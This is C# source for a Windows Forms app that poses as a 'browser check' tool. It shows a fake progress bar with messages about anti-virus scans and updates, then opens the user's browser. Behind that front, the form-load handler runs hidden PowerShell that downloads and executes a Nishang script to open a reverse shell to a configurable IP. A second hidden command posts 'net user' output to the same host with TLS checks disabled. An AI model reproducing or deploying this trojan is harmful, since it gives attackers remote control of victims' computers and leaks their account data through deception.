using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Timers; // For progress bar timing
using System.Diagnostics; // For process creation
using Microsoft.Win32;

namespace BrowserCheck
{
    public partial class Form1 : Form
    {
        System.Timers.Timer progressBarTimer = new System.Timers.Timer(); // Creates globally-accessible timer
        
        public Form1()
        {
            InitializeComponent();
            textBox1.Text = "Not Started"; // Sets initial value of "Status" text box to "Not Started"
        }

        // When "Run Browser Check" is clicked
        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = "Running";
            progressBarTimer.Interval = 750; // Tick interval - determines how fast the progress bar will complete
            progressBarTimer.Elapsed += OnTimedEvent; // Function to be called for each tick
            progressBarTimer.Enabled = true; // Enables timer

            progressBar1.Value = 0;   // Sets initial value of progress bar to 0
            progressBar1.Step = 4;    // Steps by 5% each time
            button1.Enabled = false;
            
        }

        // This function is called for each tick
        private void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            // Sleep for random amount of time between X and Y seconds so the users sees the initial text in button1_Click
            // where X and Y numbers in milliseconds
            if (progressBar1.Value == 0)
            {
                UseWaitCursor = true;
                Random r = new Random();
                Thread.Sleep(r.Next(750, 2500));

            }
            progressBar1.PerformStep(); // Performs step
            
            if (progressBar1.Value < 20)
            {
                textBox1.Text = "Testing Network Connection";
                if (progressBar1.Value == progressBar1.Step)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = "powershell.exe";
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    string ip_addr = "10.0.0.27";       //change this to the ip address that you control for the reverse shell, or the ip of the host for a bind shell
                    int port_num = 443;                 //change this to the port number on the corresponding ip address
                    string resource = "/index.php?id=";              //change this to the document you want to process the request. e.g. index.php

                    //the [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };  disables ssl/tls verification
                    startInfo.Arguments = "-Command \"$postParams = net user | ConvertTo-JSON ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; " +
                        "Invoke-WebRequest -Uri https://" + ip_addr + ":" + port_num + resource + "  -ContentType application/json -Method POST -Body $postParams \"";

                    Process.Start(startInfo);
                }
            }
            else if (progressBar1.Value >= 20 && progressBar1.Value < 40)
            {
                textBox1.Text = "Detecting System Configuration";
            }
            else if (progressBar1.Value >= 40 && progressBar1.Value < 60)
            {
                textBox1.Text = "Checking for Anti-Virus";
            }
            else if (progressBar1.Value >= 60 && progressBar1.Value < 80)
            {
                if (progressBar1.Value == 60)
                    progressBar1.Step = 2;
                textBox1.Text = "Checking Windows Update";
            }
            else if (progressBar1.Value >= 80 && progressBar1.Value < 100)
            {
                if (progressBar1.Value == 80)
                    progressBar1.Step = 1;
                textBox1.Text = "Applying Updates";
            }
            // If progress bar is at 100% - we need to stop the timer
            if (progressBar1.Value == 100)
            {
                progressBarTimer.Stop(); // Stops timer
                UseWaitCursor = false;
                textBox1.Text = "Passed"; // Sets "Status" text box to "Passed"
                MessageBox.Show("Your computer has passed the system check.\n\nClick OK to continue to connect to the network.\n\n"); // Displays pop-up window to user letting them know that they passed

                textBox1.Text = "Connecting";

                //Detects default browser and launches it with specified url
                string browserName = "";
                string url = "https://www.google.com";
                start_browser(detect_browser(browserName), url);
               
                button1.Enabled = true;
                textBox1.Text = "Connected!";
            }

        }

        // When the program loads
        private void Form1_Load(object sender, EventArgs e)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell.exe";
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            string shell_type = "Reverse";      //Valid options are Bind or Reverse
            string ip_addr = "10.0.0.27";       //change this to the ip address that you control for the reverse shell, or the ip of the host for a bind shell
            int port_num = 443;                 //change this to the port number on the corresponding ip address
            startInfo.Arguments = "-Command \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1') ; " +
                                             "Invoke-PowerShellTcp -" + shell_type + " -IPAddress " + ip_addr + " -Port " + port_num + "\"";
            Process.Start(startInfo);
            
            
        }

        //Determines users default browser
        private string detect_browser(string browserName)
        {
            
            RegistryKey userChoiceKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice");
            {
                if (userChoiceKey != null)
                {
                    object progIdValue = userChoiceKey.GetValue("Progid");
                    if (progIdValue != null)
                    {
                        if (progIdValue.ToString().ToLower().Contains("chrome"))
                            browserName = "chrome.exe";
                        else if (progIdValue.ToString().ToLower().Contains("firefox"))
                            browserName = "firefox.exe";
                        else if (progIdValue.ToString().ToLower().Contains("app")) //Microsoft edge
                            browserName = "microsoft-edge:";
                    }
                }
            }
            return browserName;
        }

        private void start_browser(string browserName, string url)
        {
            ProcessStartInfo browser = new ProcessStartInfo();

            //Different browsers require different arguments needed in order to launch
            if (browserName != "microsoft-edge:")
            {
                browser.FileName = browserName;
                browser.Arguments = url;
            }
            else
            {
                browser.FileName = "microsoft-edge:" + url;
            }
            int browserLaunchDelay = 500;     //time in miliseconds
            Thread.Sleep(browserLaunchDelay); //Sleep this pretending to launch the browser
            Process.Start(browser);

        }
        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}
